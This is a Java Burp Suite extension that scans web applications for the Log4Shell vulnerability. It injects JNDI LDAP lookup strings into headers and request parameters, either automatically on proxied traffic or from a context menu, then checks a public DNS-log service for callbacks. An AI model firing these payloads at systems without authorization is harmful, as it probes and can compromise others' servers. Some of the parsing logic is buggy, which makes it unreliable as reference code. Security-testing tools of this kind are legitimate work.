package burp;

import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.locks.ReentrantLock;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;

import sun.rmi.runtime.Log;

import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLSession;
import javax.net.ssl.TrustManager;
import javax.net.ssl.*;
import javax.swing.*;
import javax.swing.border.EmptyBorder;
import javax.swing.table.AbstractTableModel;
import javax.swing.table.DefaultTableModel;
import javax.swing.table.TableModel;
import javax.swing.event.ChangeEvent;
import javax.swing.event.ChangeListener;

//ITab 插件添加新标签页
public class BurpExtender extends AbstractTableModel implements IBurpExtender, IScannerCheck, ITab, IMessageEditorController, IContextMenuFactory, IHttpListener{
    public IBurpExtenderCallbacks callbacks;
    public IExtensionHelpers helpers;
    public PrintWriter stdout;
    private JSplitPane splitPane;
    private JPanel contentPane;
	private JTextField txtIp;
    private IMessageEditor requestViewer;
    private IMessageEditor responseViewer;
    private Table logTable;
    private List<String> list = new ArrayList();
    private boolean isopen = false;           //插件默认不开启
    private boolean isclear = false;           //clear list
    private boolean isdomains = false;        //是否输入多个domain name
    private String domain = "";
    private String domains[]=null;
    private final List<LogEntry> log = new ArrayList<LogEntry>();
    private ReentrantLock lock = new ReentrantLock(true);
    private IHttpRequestResponse currentlyDisplayedItem;
    @Override
    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
        this.callbacks = callbacks;
        this.stdout = new PrintWriter(callbacks.getStdout(), true);
        this.helpers = callbacks.getHelpers();
        this.stdout.println("Have Fun!");
        callbacks.setExtensionName("log4jScan");//插件命名
        callbacks.registerScannerCheck(this);
        callbacks.registerContextMenuFactory(this);
        SwingUtilities.invokeLater(new Runnable(){
            @Override
            public void run() {
            	
        		contentPane = new JPanel();
        		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
        		contentPane.setLayout(new BorderLayout(0, 0));
        		
            	//顶部
            	JPanel panel = new JPanel();
        		contentPane.add(panel, BorderLayout.NORTH);
        		
        		JToggleButton tglbtnNewToggleButton = new JToggleButton("自动扫描开/关");
        		panel.add(tglbtnNewToggleButton);
        		
        		JLabel lblNewLabel_1 = new JLabel("输入域名过滤:");
        		panel.add(lblNewLabel_1);
        		lblNewLabel_1.setSize(50, 10);
        		
        		txtIp = new JTextField();
        		txtIp.setText("域名(多个域名采用;隔开)");
        		panel.add(txtIp);
        		txtIp.setColumns(20);
        		
        		
        		JLabel lblNewLabel = new JLabel("当前过滤域名 : 空");
        		panel.add(lblNewLabel);
        		lblNewLabel.setSize(50, 10);
        		
        		JButton btnNewButton_1 = new JButton("确认");
        		panel.add(btnNewButton_1);
        		
        		JButton btnNewButton = new JButton("过滤清空");
        		panel.add(btnNewButton);
        		
        		JButton btnNewButton_2 = new JButton("扫描列表清空");
        		panel.add(btnNewButton_2);
        		
                splitPane = new JSplitPane(JSplitPane.VERTICAL_SPLIT);
                contentPane.add(splitPane);
                logTable = new Table(BurpExtender.this);
                JScrollPane scrollPane = new JScrollPane(logTable);
                splitPane.setLeftComponent(scrollPane);

                JTabbedPane tabs = new JTabbedPane();
                requestViewer = BurpExtender.this.callbacks.createMessageEditor(BurpExtender.this, false);
                responseViewer = BurpExtender.this.callbacks.createMessageEditor(BurpExtender.this, false);
                tabs.addTab("Request", requestViewer.getComponent());
                tabs.addTab("Response", responseViewer.getComponent());
                splitPane.setRightComponent(tabs);
                
                
                //监听器 domain name save
                btnNewButton_1.addActionListener(new ActionListener() {
        			public void actionPerformed(ActionEvent e) {
        				domain = txtIp.getText();
        				if(domain.contains(";")) {
        					isdomains = true;
        					domains = domain.split(";");
        					
        				}
        				if(domain.equals("")) {
        					domains = null;
        					stdout.println("domain name filter : NULL");
        					lblNewLabel.setText("当前过滤域名 : 空");
        				}
        				else {
        					stdout.println("domain name filter :" + domain);
        					lblNewLabel.setText("当前过滤域名 : " + domain);
        				}
        			}
        		});
                
                //监听器 clear
                btnNewButton.addActionListener(new ActionListener() {
        			public void actionPerformed(ActionEvent e) {
        				domain = "";
        				isdomains = false;
        				domains = null;
        				txtIp.setText("");
        				lblNewLabel.setText("当前过滤域名 : 空");
        				txtIp.setText("域名(多个域名采用;隔开)");
        			}
        		});
                
                //监听器 开关
                tglbtnNewToggleButton.addMouseListener(new MouseAdapter() {
        			@Override
        			public void mouseClicked(MouseEvent e) {
        				JToggleButton tglbtnNewToggleButton = (JToggleButton) e.getSource();
        				isopen = !isopen;
        				if(isopen == false) {
        					tglbtnNewToggleButton.setText("自动扫描关闭");
        				}
        				else {
        					tglbtnNewToggleButton.setText("自动扫描开启");
        				}
        				
        			}
        		});
                
                //监听器 clear list
                btnNewButton_2.addMouseListener(new MouseAdapter() {
        			@Override
        			public void mouseClicked(MouseEvent e) {
        				fireTableRowsDeleted(0,log.size());
        				log.clear();
        				list.clear();
        			}
        		});

                BurpExtender.this.callbacks.customizeUiComponent(txtIp);
                BurpExtender.this.callbacks.customizeUiComponent(panel);
                BurpExtender.this.callbacks.customizeUiComponent(tglbtnNewToggleButton);
                BurpExtender.this.callbacks.customizeUiComponent(contentPane);
                BurpExtender.this.callbacks.customizeUiComponent(splitPane);
                BurpExtender.this.callbacks.customizeUiComponent(logTable);
                BurpExtender.this.callbacks.customizeUiComponent(scrollPane);
                BurpExtender.this.callbacks.customizeUiComponent(tabs);

                BurpExtender.this.callbacks.addSuiteTab(BurpExtender.this);
                
                BurpExtender.this.callbacks.registerHttpListener(BurpExtender.this);
            }
        });
    }

    @Override
    public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {
        return null;
    }

    @Override
    public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        return null;
    }

    @Override
    public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) {
        return 0;
    }
    
    // POST {"a":"1","b":"2"}
    public List<String> dictojson(Map<String, Object> dic,String dnslog) {
    	String payload_dnslog = "${jndi:ldap://" + dnslog + "/a}";
    	List<String> payloads = new ArrayList<String>();;
    	for(Map.Entry<String, Object> entry : dic.entrySet()) {
    		Object a = entry.getValue();
    		dic.put(entry.getKey(),payload_dnslog);
    		String jsonObject = JSON.toJSONString(dic);
    		payloads.add(jsonObject);
    		dic.put(entry.getKey(),a);
    	}
    	return payloads;
    }
    
    // POST/GET a=1&b=2
    public List<String> dictostring(Map<String, Object> dic,String dnslog) {
    	String payload_dnslog = "${jndi:ldap://" + dnslog + "/a}";
    	List<String> payloads = new ArrayList<String>();
    	Map<String, Object> dicc = dic;
    	for(Map.Entry<String, Object> entry : dic.entrySet()) {
    		String url = "";
    		Object a = entry.getValue();
    		dicc.put(entry.getKey(),payload_dnslog);
    		for(Map.Entry<String, Object> entryy : dicc.entrySet()) {
    			url+=entryy.getKey();
    			url+="=";
    			url+=entryy.getValue();
    			url+="&";
    		}
    		dicc.put(entry.getKey(),a);
    		payloads.add(url);
    	}
    	return payloads;
    }
    
    //dnslog https://log.xn--9tr.com/new_gen
    public List<String> dnslog(){
    	List<String> dns_info = new ArrayList<>();
    	try {
	        // 1. 创建 URL 实例
	        URL urlForGetRequest = new URL("https://log.xn--9tr.com/new_gen");
	        String readLine = null;
	
	        // 2. 打开到远程服务器的连接
	        HttpsURLConnection conection = (HttpsURLConnection) urlForGetRequest.openConnection();
	
	        // 3. 设置连接属性，比如请求方法和请求参数
	        //conection.setHostnameVerifier(DO_NOT_VERIFY);
	        conection.setRequestMethod("GET");
	        conection.setRequestProperty("Host", "log.xn--9tr.com");
	        conection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36");
	
	        // 4. 发起请求并获取响应的状态码
	        int responseCode = conection.getResponseCode();
	       
	        // 5. 根据状态码作出一些判断，如果为 200 则表示成功
	        if (responseCode == HttpURLConnection.HTTP_OK) {
	            // 6. 使用 getInputStream() 获取输入流并读取输入流里的数据
	            BufferedReader in = new BufferedReader(
	                new InputStreamReader(conection.getInputStream()));
	
	            // 7. 其它处理逻辑，这里直接输出响应的数据
	            StringBuffer response = new StringBuffer();
	            while ((readLine = in.readLine()) != null) {
	                response.append(readLine);
	            }
	            in.close();
	            JSONObject json = JSON.parseObject(response.toString());
	            json.getString("domain");
	            json.getString("token");
	            //this.stdout.println("Dnslog Token: " + json.getString("token") + "Dnslog adderss: " + json.getString("domain"));
	            dns_info.add(json.getString("domain"));
	            dns_info.add(json.getString("token"));
	        } else {
	        	this.stdout.println("Dnslog Dead XD");
	        }
    	}
    	catch(Exception e) {
    		
    	}
    	return dns_info;
    }
    
  //dnslog https://log.xn--9tr.com/new_gen
    public Boolean dnslog_res(String cookie){
    	Boolean res = false;
    	try {
	        // 1. 创建 URL 实例
	        URL urlForGetRequest = new URL("https://log.xn--9tr.com/"+cookie);
	        String readLine = null;
	
	        // 2. 打开到远程服务器的连接
	        HttpsURLConnection conection = (HttpsURLConnection) urlForGetRequest.openConnection();
	
	        // 3. 设置连接属性，比如请求方法和请求参数
	        conection.setRequestMethod("GET");
	        conection.setRequestProperty("Host", "log.xn--9tr.com");
	        conection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36");
	
	        // 4. 发起请求并获取响应的状态码
	        int responseCode = conection.getResponseCode();
	
	        // 5. 根据状态码作出一些判断，如果为 200 则表示成功
	        if (responseCode == HttpURLConnection.HTTP_OK) {
	        	
	        	
	            // 6. 使用 getInputStream() 获取输入流并读取输入流里的数据
	            BufferedReader in = new BufferedReader(
	                new InputStreamReader(conection.getInputStream()));
	
	            // 7. 其它处理逻辑，这里直接输出响应的数据
	            StringBuffer response = new StringBuffer();
	            while ((readLine = in.readLine()) != null) {
	                response.append(readLine);
	            }
	            in.close();
	            
	            if(response.toString().equals("null")) {
	            	res = false;
	            }
	            else {
	            	res = true;
	            }
	        } else {
	        	this.stdout.println("Dnslog Back Dead XD");
	        }
    	}
    	catch(Exception e) {
    		
    	}
    	return res;
    }
    

    // log4j漏洞检测，单次替换一个参数
    public void checkVul(IHttpRequestResponse baseRequestResponse, int row){
    	//this.stdout.println(helpers.analyzeRequest(baseRequestResponse).getUrl());
        List<String> payloads = new ArrayList<String>();
        // 这里获得的url是完整的url
        URL url = this.helpers.analyzeRequest(baseRequestResponse).getUrl();
        String method = this.helpers.analyzeRequest(baseRequestResponse).getMethod();
        // 返回的是一个字节，不同的content-type用不同的数字代表，其中4表示application/json
        byte content_type = this.helpers.analyzeRequest(baseRequestResponse).getContentType();
        // 拿到的headers是一个数组类型，每一个元素都是类似这样：Host: 127.0.0.1
        List<String> headers =  this.helpers.analyzeRequest(baseRequestResponse).getHeaders();
        
     // log4j payload
        List<String> dnslog_res = dnslog();
        String dnslog = dnslog_res.get(0);
        
        this.stdout.println("Test URL:  " + this.helpers.analyzeRequest(baseRequestResponse).getUrl()+"  Test DNS:  "+dnslog_res.get(0)+"  Test DNS Token:  "+dnslog_res.get(1));
        
        try{
        	//POST
            if(method.equals("POST")){
                IHttpService iHttpService = baseRequestResponse.getHttpService();
                List<String> newHeaders = new ArrayList<>();
                int bodyOffset = this.helpers.analyzeRequest(baseRequestResponse).getBodyOffset();
                byte[] byte_Request = baseRequestResponse.getRequest();

                String request2 = new String(byte_Request);
                String body = request2.substring(bodyOffset);
                
                //Header头遍历
                List<String> headerss = headers;
                for(int i = 0;i<headers.size();i++) {
                	if(!headers.get(i).contains(": ")) {
                		continue;
                	}
                	//不包含 Content-Length   Content-Type  Cookie
                	if(!headers.get(i).startsWith("Content-Length") && !headers.get(i).startsWith("Content-Type") && !headers.get(i).startsWith("Cookie")) {
                		String[] strs = headers.get(i).split(": ");
                		String header_new = strs[0] + ": " + "${jndi:ldap://" + dnslog + "/a}";
                		String header_old = headers.get(i);
                		headerss.remove(headers.get(i));
                		headerss.add(i,header_new);
                        byte[] postMessage = this.helpers.buildHttpMessage(headerss, this.helpers.stringToBytes(body));
                        // 向目标发送payload
                        IHttpRequestResponse resp = this.callbacks.makeHttpRequest(iHttpService, postMessage);
                        headerss.remove(header_new);
                		headerss.add(i,header_old);
                	}
                }
                
                //判断POST数据格式 目前支持  application/json   application/x-www-urlencoded
                if(content_type == IRequestInfo.CONTENT_TYPE_JSON) {
                	//application/json
                	
                	Map<String, Object> dic = new HashMap<>();
                	for(int i = 0; i < this.helpers.analyzeRequest(baseRequestResponse).getParameters().size(); i++) {
                		if(this.helpers.analyzeRequest(baseRequestResponse).getParameters().get(i).getType() == 6) {
                			dic.put(this.helpers.analyzeRequest(baseRequestResponse).getParameters().get(i).getName(),this.helpers.analyzeRequest(baseRequestResponse).getParameters().get(i).getValue());
                		}
                	}
                	payloads = dictojson(dic,dnslog);
                	for (String payload:payloads){
                        byte[] bytePayload = this.helpers.stringToBytes(payload);
                        byte[] postMessage = this.helpers.buildHttpMessage(headers, bytePayload);
                        // 向目标发送payload
                        IHttpRequestResponse resp = this.callbacks.makeHttpRequest(iHttpService, postMessage);
                    }
                	// 担心目标有延迟，所有延时5秒再查看dnslog平台
                	Thread.sleep(5000);
                	Boolean dnsres = dnslog_res(dnslog_res.get(1));
                	if(dnsres){
                        LogEntry logEntry = new LogEntry(url, "finished", "vul!!!", baseRequestResponse);
                        log.set(row, logEntry);
                        fireTableRowsUpdated(row, row);
                    }
                	if(!dnsres){
                        LogEntry logEntry = new LogEntry(url, "finished", "not vul", baseRequestResponse);
                        log.set(row, logEntry);
                        fireTableRowsUpdated(row, row);
                    }
                	
                }
                else if (content_type == IRequestInfo.CONTENT_TYPE_URL_ENCODED) {
                	//application/x-www-form-urlencoded
                	
                	Map<String, Object> dic = new HashMap<>();
                	for(int i = 0; i < this.helpers.analyzeRequest(baseRequestResponse).getParameters().size(); i++) {
                		if(this.helpers.analyzeRequest(baseRequestResponse).getParameters().get(i).getType() == 1) {
                			dic.put(this.helpers.analyzeRequest(baseRequestResponse).getParameters().get(i).getName(),this.helpers.analyzeRequest(baseRequestResponse).getParameters().get(i).getValue());
                		}
                	}
                	payloads = dictostring(dic,dnslog);
                	for (String payload:payloads){
                        byte[] bytePayload = this.helpers.stringToBytes(payload);
                        byte[] postMessage = this.helpers.buildHttpMessage(headers, bytePayload);
                        // 向目标发送payload
                        IHttpRequestResponse resp = this.callbacks.makeHttpRequest(iHttpService, postMessage);
                    }
                	// 担心目标有延迟，所有延时5秒再查看dnslog平台
                	Thread.sleep(5000);
                	Boolean dnsres = dnslog_res(dnslog_res.get(1));
                	if(dnsres){
                        LogEntry logEntry = new LogEntry(url, "finished", "vul!!!", baseRequestResponse);
                        log.set(row, logEntry);
                        fireTableRowsUpdated(row, row);
                    }
                	if(!dnsres){
                        LogEntry logEntry = new LogEntry(url, "finished", "not vul", baseRequestResponse);
                        log.set(row, logEntry);
                        fireTableRowsUpdated(row, row);
                    }
                }
                else {
                	Thread.sleep(5000);
                	Boolean dnsres = dnslog_res(dnslog_res.get(1));
                	if(dnsres){
                        LogEntry logEntry = new LogEntry(url, "finished", "vul!!!", baseRequestResponse);
                        log.set(row, logEntry);
                        fireTableRowsUpdated(row, row);
                    }
                	if(!dnsres){
                        LogEntry logEntry = new LogEntry(url, "finished", "not vul", baseRequestResponse);
                        log.set(row, logEntry);
                        fireTableRowsUpdated(row, row);
                    }
                }
            }else if(method.equals("GET")){
                // GET
                IHttpService iHttpService = baseRequestResponse.getHttpService();
                List<String> newHeaders = new ArrayList<>();
                
                int bodyOffset = this.helpers.analyzeRequest(baseRequestResponse).getBodyOffset();
                byte[] byte_Request = baseRequestResponse.getRequest();

                String request2 = new String(byte_Request);
                String body = request2.substring(bodyOffset);
                
                //Header
                List<String> headerss = headers;
                for(int i = 0;i<headers.size();i++) {
                	if(!headers.get(i).contains(": ")) {
                		continue;
                	}
                	// /?a=1&b=2
                	if(i == 2 && headers.get(i).contains("?")) {
                		Map<String, Object> dic = new HashMap<>();
                		String url_old = headers.get(i);
                		String[] urls = headers.get(i).split("?");
                		for(int j = 0; j < this.helpers.analyzeRequest(baseRequestResponse).getParameters().size(); j++) {
                			if(this.helpers.analyzeRequest(baseRequestResponse).getParameters().get(i).getType() == 0) {
                				dic.put(this.helpers.analyzeRequest(baseRequestResponse).getParameters().get(i).getName(),this.helpers.analyzeRequest(baseRequestResponse).getParameters().get(i).getValue());
                			}
                		}
                		payloads = dictostring(dic,dnslog);
                    	for (String payload:payloads){
                    		headerss.set(i, urls[0]+"?"+payload);
                            byte[] bytePayload = this.helpers.stringToBytes("");
                            byte[] postMessage = this.helpers.buildHttpMessage(headerss, bytePayload);
                            // 向目标发送payload
                            IHttpRequestResponse resp = this.callbacks.makeHttpRequest(iHttpService, postMessage);
                            headerss.set(i, url_old);
                        }
                		headers.set(i, urls[0]+"");
                	}
                	//不包含 Content-Length   Content-Type  Cookie
                	if(!headers.get(i).startsWith("Content-Length") && !headers.get(i).startsWith("Content-Type") && !headers.get(i).startsWith("Cookie")) {
                		String[] strs = headers.get(i).split(": ");
                		String header_new = strs[0] + ": " + "${jndi:ldap://" + dnslog + "/a}";
                		String header_old = headers.get(i);
                		headerss.remove(headers.get(i));
                		headerss.add(i,header_new);
                        byte[] postMessage = this.helpers.buildHttpMessage(headerss, this.helpers.stringToBytes(body));
                        // 向目标发送payload
                        IHttpRequestResponse resp = this.callbacks.makeHttpRequest(iHttpService, postMessage);
                        headerss.remove(header_new);
                		headerss.add(i,header_old);
                	}
                }
                // 担心目标有延迟，所有延时5秒再查看dnslog平台
            	Thread.sleep(5000);
            	Boolean dnsres = dnslog_res(dnslog_res.get(1));
            	if(dnsres){
                    LogEntry logEntry = new LogEntry(url, "finished", "vul!!!", baseRequestResponse);
                    log.set(row, logEntry);
                    fireTableRowsUpdated(row, row);
                }
            	if(!dnsres){
                    LogEntry logEntry = new LogEntry(url, "finished", "not vul", baseRequestResponse);
                    log.set(row, logEntry);
                    fireTableRowsUpdated(row, row);
                }
            }
        }catch (Exception e){
            this.stdout.println(e);
            e.printStackTrace();
        }
    }
    // tab页的显示名称
    @Override
    public String getTabCaption() {
        return "log4j Scan";
    }
    // 返回UI面板
    @Override
    public Component getUiComponent() {
        return contentPane;
    }

    @Override
    public int getRowCount() {
        return log.size();
    }

    @Override
    public int getColumnCount() {
        return 3;
    }

    @Override
    public String getValueAt(int rowIndex, int columnIndex) {
        LogEntry logEntry = log.get(rowIndex);

        switch (columnIndex)
        {
            case 0:
                return logEntry.url.toString();
            case 1:
                return logEntry.status;
            case 2:
                return logEntry.res;
            default:
                return "";
        }
    }

    @Override
    public String getColumnName(int column) {
        switch (column){
            case 0:
                return "URL";
            case 1:
                return "Status";
            case 2:
                return "result";
            default:
                return "";
        }
    }

    @Override
    public IHttpService getHttpService() {
        return currentlyDisplayedItem.getHttpService();
    }

    @Override
    public byte[] getRequest() {
        return currentlyDisplayedItem.getRequest();
    }

    @Override
    public byte[] getResponse() {
        return currentlyDisplayedItem.getResponse();
    }
    
  //对HTTP消息的处理和添加HTTP消息到History列表中
    @Override
    public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo) {
    	if (isopen == false)
    		return;
    	try {
    		Thread thread = new Thread(new Runnable() {
    			@Override
    			public void run() {
    				//线程锁，解决当大量请求同时被送至插件时，数据更新出现BUG的问题
    				lock.lock();
    				forward(messageInfo);
    	        }
    	    });
	    	if(messageIsRequest) {
	    		//过滤静态文件
	    		String []stats = {".js",".css",".png",".jpg",".jpge",".gif",".ttf",".woff",".ico",".mp3",".mp4"};
	    		for(String stat:stats) {
	    			if(helpers.analyzeRequest(messageInfo).getUrl().toString().contains(stat)) {
	    				return;
	    			}
	    		}
		    	if (helpers.analyzeRequest(messageInfo).getMethod() == "POST" || helpers.analyzeRequest(messageInfo).getMethod() == "GET") {
		    		if(list.contains(helpers.analyzeRequest(messageInfo).getUrl().toString()) == false) {
		    			list.add(helpers.analyzeRequest(messageInfo).getUrl().toString());
			    		if(domain.equals("") && domains == null) {
			    			thread.start();
			    		}
			    		else {
			    			if(isdomains == false) {           //单个 过滤
			    				if(domain.equals(helpers.analyzeRequest(messageInfo).getHeaders().get(1).substring(6).split(":")[0])) {
			    					thread.start();
				    			}
				    			else
				    				return;
			    			}
			    			else {             //多个  过滤
			    				for(int i = 0 ; i <= domains.length-1 ; i++) {
			    					if(domains[i].equals(helpers.analyzeRequest(messageInfo).getHeaders().get(1).substring(6).split(":")[0])) {
			    						thread.start();
			    					}
			    				}
			    			}
			    		}
		    		}
		    	}
		    	else
		    		return;
	    	}
		} catch (Exception e) {
			e.printStackTrace();
		}
    	
    }

    // 这个方法就是将log4j scan添加到菜单中
    @Override
    public List<JMenuItem> createMenuItems(IContextMenuInvocation invocation) {
        List<JMenuItem> menus = new ArrayList<>(1);
        IHttpRequestResponse responses[] = invocation.getSelectedMessages();
        JMenuItem menuItem = new JMenuItem("Send to log4j Scan");
        menus.add(menuItem);
        menuItem.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                // logTable.addRowSelectionInterval();
                int row = log.size();
                LogEntry logEntry = new LogEntry(helpers.analyzeRequest(responses[0]).getUrl(), "scanning", "", responses[0]);
                log.add(logEntry);
                
                fireTableRowsInserted(row, row);
                // 在事件触发时是不能发送网络请求的，否则可能会造成整个burp阻塞崩溃，所以必须要新起一个线程来进行漏洞检测
                Thread thread = new Thread(new Runnable() {
                    @Override
                    public void run() {
                        checkVul(responses[0], row);
                    }
                });
                thread.start();
            }
        });
        return menus;
    }

    // 用于描述一条请求记录的数据结构
    private static class LogEntry{
        final URL url;
        final String status;
        final String res;
        final IHttpRequestResponse requestResponse;

        LogEntry(URL url, String status, String res, IHttpRequestResponse requestResponse) {
            this.url = url;
            this.status = status;
            this.res = res;
            this.requestResponse = requestResponse;
        }
    }

    // 自定义table的changeSelection方法，将request\response展示在正确的窗口中
    private class Table extends JTable
    {
        public Table(TableModel tableModel)
        {
            super(tableModel);
        }

        @Override
        public void changeSelection(int row, int col, boolean toggle, boolean extend)
        {
            // show the log entry for the selected row
            LogEntry logEntry = log.get(row);
            requestViewer.setMessage(logEntry.requestResponse.getRequest(), true);
            responseViewer.setMessage(logEntry.requestResponse.getResponse(), false);
            currentlyDisplayedItem = logEntry.requestResponse;

            super.changeSelection(row, col, toggle, extend);
        }
    }
    
    //自动转发请求至log4j scan
    private void forward(IHttpRequestResponse messageInfo) {
		//添加消息到HistoryLog记录中，供UI显示用
		int row = log.size();
	    LogEntry logEntry = new LogEntry(helpers.analyzeRequest(messageInfo).getUrl(), "scanning", "", messageInfo);
	    log.add(logEntry);
	    fireTableRowsInserted(row, row);
		Thread thread = new Thread(new Runnable() {
			@Override
			public void run() {
	            checkVul(messageInfo, row);
	        }
	    });
		thread.start();
		lock.unlock();
    }
}
